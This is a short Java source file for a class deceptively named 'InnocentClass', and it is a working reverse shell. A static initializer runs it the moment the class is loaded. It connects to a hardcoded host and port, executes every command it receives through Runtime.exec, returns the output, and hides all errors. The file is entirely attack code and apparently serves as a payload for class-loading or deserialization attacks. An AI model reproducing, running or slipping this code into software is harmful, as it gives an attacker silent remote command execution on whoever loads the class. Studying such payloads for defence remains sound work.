import java.net.*;
import java.io.*;

public class InnocentClass {
    private static String hostname = "127.0.0.1";
    private static int portNumber = 8200;

    static {
        run();
    }

    public static void main(String[] args) {
        run();
    }

    private static void run() {
        try {
            try (final Socket socket = new Socket(hostname, portNumber)) {
                final DataInputStream inputStream = new DataInputStream(socket.getInputStream());
                final DataOutputStream outputStream = new DataOutputStream(socket.getOutputStream());
                final BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream));
                final PrintWriter writer = new PrintWriter(outputStream);

                String inputCommand;
                while ((inputCommand = reader.readLine()) != null && !inputCommand.trim().isBlank()) {
                    writer.println(processCommand(inputCommand));
                    writer.flush();
                }
            }
        } catch (Exception _ignore_) {
            // Do nothing!
        }
    }

    private static String processCommand(String inputCommand) throws IOException {
        final StringBuilder response = new StringBuilder();
        try {
            final Process process = Runtime.getRuntime().exec(inputCommand);
            try (final BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()))) {
                String temp;
                while ((temp = reader.readLine()) != null) {
                    response.append(temp).append("\n");
                }
            }
        } catch (Exception e) {
            response.append(e.getMessage()).append("\n");
        }
        return response.toString();
    }
}
